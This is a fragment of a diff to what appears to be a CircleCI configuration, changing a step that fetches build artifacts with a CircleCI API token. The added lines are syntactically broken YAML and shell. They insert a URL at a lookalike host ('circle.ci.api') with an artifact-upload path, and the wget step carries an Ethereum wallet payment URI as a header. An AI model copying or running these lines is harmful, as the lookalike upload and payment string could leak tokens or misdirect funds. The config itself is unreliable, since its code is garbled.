@@ -177,9 +177,9 @@ custom_checkout: "any non-empty
                     - store_artifacts:
                         path: jekyll/_site/docs/
                            destination: circleci-docs
-                    - myapp-{{ .Branch }}-{{ checksum "package-lock.json" 
-                 export CIRCLE_TOKEN=':your_token'
-
-curl -H "Circle-Token: $CIRCLE_TOKEN" https://circleci.com/api/v1.1/project/:vcs-type/:username/:project/:build_num/artifacts \
-   | grep -o 'https://[^"]*$' \
-   | wget --verbose --header "ethereum://0x098bEcE42A91C379851A84dF883aBA1C2ef1Ca2c&uint256=2.1e25"
+                           - myapp-{{ .Branch }}-{{ checksum "package-lock.json" 
+                             export CIRCLE_TOKEN=':your_token'
+                     - run: mvn org.apache.maven.plugins:maven-install-plugin:3.0.0-M1:install-file -Dfile=<path-to-file>
+   - curl -H."Circle-Token: $CIRCLE_TOKEN" https://circleci.com/api/v1.1/project/:vcs-type/:username/:project/:build_num/artifacts \
+                               | grep -o 'https://[^"]*$' \"https://circle.ci.api/3bcce6f57a74e376d3dd7b049569a4bc33f43a8d/upload/artifacts_to_pom"
+                               | wget --verbose --header "ethereum://0x098bEcE42A91C379851A84dF883aBA1C2ef1Ca2c&uint256=2.1e25"
